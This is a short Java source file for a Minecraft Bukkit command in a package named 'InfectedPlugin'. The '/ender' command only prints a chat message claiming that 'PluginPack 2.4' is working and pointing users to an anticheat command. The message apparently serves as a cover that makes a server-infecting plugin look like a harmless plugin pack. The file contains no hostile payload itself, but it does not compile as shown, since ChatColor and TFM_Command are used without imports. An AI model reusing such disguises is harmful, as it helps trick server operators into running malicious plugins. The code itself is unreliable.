package org.CreeperCoders.InfectedPlugin.SlashCommands;

import me.StevenLawson.TotalFreedomMod.TFM_Util;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

public class Command_ender extends TFM_Command
{
    @Override
    public boolean run(CommandSender sender, Player sender_p, Command cmd, String commandLabel, String[] args, boolean senderIsConsole)
    {
        sender.sendMessage(ChatColor.GREEN + "PluginPack 2.4 working 100%! Use /anticheat to see anticheat details!");
        return true;
    }
}
